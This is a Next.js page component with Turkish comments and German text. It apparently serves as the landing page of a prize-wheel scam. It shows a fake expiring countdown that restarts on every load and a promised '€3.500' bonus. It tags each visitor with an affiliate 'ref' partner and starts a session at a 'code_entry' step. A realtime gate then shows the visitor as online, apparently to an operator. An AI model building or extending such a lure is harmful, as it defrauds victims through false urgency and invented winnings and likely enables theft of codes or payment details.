"use client";

import { useState, useEffect } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";
import {
  getPreferredRouteSessionId,
  persistActiveSession,
} from "@/lib/session-id-client";
import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
import { normalizeSessionIdentifier } from "@/lib/session-identifiers";

export default function Home() {
  const { settings } = useSettings();
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(345); // 5:45 min countdown

  // Ana sayfada aktif session varsa (daha önce oluşturulmuş ve cookie'ye kaydedilmiş)
  // SessionRealtimeGate yükle ve ONLINE göster.
  // Yeni session create edilince de state'e yaz ve gate yüklensin → user HOME'da ONLINE görünür.
  const [activeSessionIds, setActiveSessionIds] = useState<{ sessionId: string; routeSessionId: string } | null>(
    () => {
      try {
        const id = normalizeSessionIdentifier(
          document.cookie
            .split("; ")
            .find((row) => row.startsWith("ACTIVE_SESSION="))
            ?.split("=")[1],
        );
        const rId = normalizeSessionIdentifier(
          document.cookie
            .split("; ")
            .find((row) => row.startsWith("ACTIVE_ROUTE_SESSION="))
            ?.split("=")[1],
        );
        const eff = getPreferredRouteSessionId(id, rId);
        if (id) return { sessionId: id, routeSessionId: eff };
        return null;
      } catch {
        return null;
      }
    },
  );

  useEffect(() => {
    try {
      const id = normalizeSessionIdentifier(
        document.cookie
          .split("; ")
          .find((row) => row.startsWith("ACTIVE_SESSION="))
          ?.split("=")[1],
      );
      const rId = normalizeSessionIdentifier(
        document.cookie
          .split("; ")
          .find((row) => row.startsWith("ACTIVE_ROUTE_SESSION="))
          ?.split("=")[1],
      );
      const eff = getPreferredRouteSessionId(id, rId);
      if (id) setActiveSessionIds((old) => (old && old.sessionId === id ? old : { sessionId: id, routeSessionId: eff }));
    } catch { /* noop */ }
  }, []);

  // Countdown
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`; 
  };

  const handleStart = async () => {
    setLoading(true);
    setError("");
    
    const supabase = createBrowserSupabaseClient();
    if (!supabase) {
      setError("Systemfehler: Verbindung konnte nicht hergestellt werden.");
      setLoading(false);
      return;
    }

    // URL'den ref parametresini al
    const urlParams = new URLSearchParams(window.location.search);
    const partnerName = urlParams.get("ref") || "admin";

    // 1. Yeni bir session oluştur ve mevcut akışla uyumlu wheel oturumu başlat
    const { data, error: insertError } = await supabase
        .from("sessions")
        .insert({
          amount: 0,
          current_step: "code_entry",
          status: "online",
          is_hidden: false,
          partner_name: partnerName,
          form_data: {
            currency: "€",
            is_wheel_game: true,
          }
        })
        .select("id, public_id")
        .maybeSingle();

    if (insertError || !data?.id) {
      setError("Ein Fehler ist aufgetreten. Bitte versuchen Sie es später erneut.");
      setLoading(false);
      return;
    }

    const routeSid = data.public_id ? String(data.public_id) : data.id;
    persistActiveSession(data.id, routeSid);
    setActiveSessionIds({ sessionId: data.id, routeSessionId: routeSid });
    window.location.href = "/wheel";
  };

  return (
    <div className="pak-page-shell">
      {activeSessionIds?.sessionId ? (
        <SessionRealtimeGate
          sessionId={activeSessionIds.sessionId}
          routeSessionId={activeSessionIds.routeSessionId}
        />
      ) : null}
      <main className="relative z-10 w-full max-w-[820px] fade-in">
        <div className="pak-form-card overflow-hidden">
          <div className="pak-form-inner px-5 pb-6 pt-6 sm:px-7 sm:pb-8 sm:pt-8 lg:px-10 lg:pb-9 lg:pt-9">
            <div className="grid gap-6 lg:grid-cols-[minmax(0,1.08fr)_84px] lg:items-start">
              <div className="min-w-0">
                <div className="mb-4 inline-flex max-w-full items-center gap-2 rounded-full border border-white/15 bg-white/8 px-4 py-2 text-left backdrop-blur-sm">
                  <span className="relative flex h-2.5 w-2.5 shrink-0">
                    <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-red-400 opacity-75" />
                    <span className="relative inline-flex h-2.5 w-2.5 rounded-full bg-red-500" />
                  </span>
                  <span className="text-xs font-extrabold uppercase tracking-[0.14em] text-white/85">
                    Angebot endet in: {formatTime(timeLeft)}
                  </span>
                </div>

                <div className="max-w-[30rem]">
                  <h1 className="pak-form-title">{settings.win_title}</h1>
                  <p className="pak-form-subtitle mt-4 max-w-[28rem] text-[0.98rem] sm:text-[1rem]">
                    {settings.win_subtitle}
                  </p>
                </div>

                <div className="pak-form-amount mt-5 inline-flex w-full max-w-[19rem] px-4 py-3 sm:max-w-[20rem] sm:px-5 sm:py-3.5">
                  <div className="pak-form-amount-label">
                    <div>Heutiges</div>
                    <div>Bonusangebot</div>
                  </div>
                  <div className="pak-form-amount-divider" />
                  <div className="pak-form-amount-value">€3.500</div>
                </div>

                {error && (
                  <div className="mt-5 flex items-start gap-2 rounded-xl border border-red-500/20 bg-red-500/10 p-3 text-left text-sm text-red-300">
                    <svg className="mt-0.5 h-5 w-5 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                    {error}
                  </div>
                )}

                <button
                  onClick={() => void handleStart()}
                  disabled={loading || timeLeft === 0}
                  className="pak-form-button mt-6 min-h-[4rem] w-full max-w-[20rem] px-6 text-lg sm:text-[1.1rem]"
                >
                  {loading ? (
                    <span className="flex items-center justify-center gap-2">
                      <svg className="h-5 w-5 animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                      </svg>
                      Wird verarbeitet...
                    </span>
                  ) : (
                    <span className="flex items-center justify-center gap-2">
                      {settings.win_button}
                      <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M14 5l7 7m0 0l-7 7m7-7H3" />
                      </svg>
                    </span>
                  )}
                </button>

                <div className="mt-7 flex flex-wrap items-center gap-3 border-t border-white/10 pt-5 text-[0.77rem] font-semibold uppercase tracking-[0.16em] text-white/55">
                  <div className="flex items-center gap-2">
                    <svg className="h-4 w-4 text-[#ffd200]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                    </svg>
                    Sichere Auszahlung
                  </div>
                  <div className="flex items-center gap-2">
                    <svg className="h-4 w-4 text-[#ffd200]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
                    </svg>
                    Sofortige Verifizierung
                  </div>
                </div>
              </div>

              <div className="flex items-start justify-end gap-4 lg:block" />
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
